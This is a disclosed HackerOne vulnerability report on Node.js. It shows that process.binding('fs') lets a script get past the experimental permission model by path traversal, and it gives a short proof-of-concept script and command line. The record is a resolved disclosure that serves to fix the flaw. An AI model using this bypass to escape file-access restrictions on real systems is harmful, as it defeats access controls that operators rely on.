---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2051257'
original_report_id: '2051257'
title: process.binding() can bypass the permission model through path traversal
weakness: Path Traversal
team_handle: nodejs
created_at: '2023-07-05T15:54:29.666Z'
disclosed_at: '2023-09-10T15:26:16.937Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- path-traversal
---

# process.binding() can bypass the permission model through path traversal

## Metadata

- HackerOne Report ID: 2051257
- Weakness: Path Traversal
- Program: nodejs
- Disclosed At: 2023-09-10T15:26:16.937Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:** process.binding('fs') bypassed the permission model validation against path traversal

**Description:** process.binding('fs') can be used to bypass the path traversal validation for the permisison model

## Steps To Reproduce:

Create the following index.js and store at `/home/pathtraversal/`
```js
// index.js
const fs = process.binding('fs')

fs.mkdir('/home/pathtraversal/../test0', 511, false, null, null)
```

```console
$ pwd
/home/pathtraversal/
$ node --experimental-permission --allow-fs-read="/home/pathtraversal/*" --allow-fs-write="/home/pathtraversal/*" index.js
```

`/home/test0` will be created bypassing the permission model validation

## Impact

All the methods exposed by the process.binding('fs') could eventually bypass the permission model using path traversal. It will require the attacker to read the node_file.cc implementation, but that's trivial.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
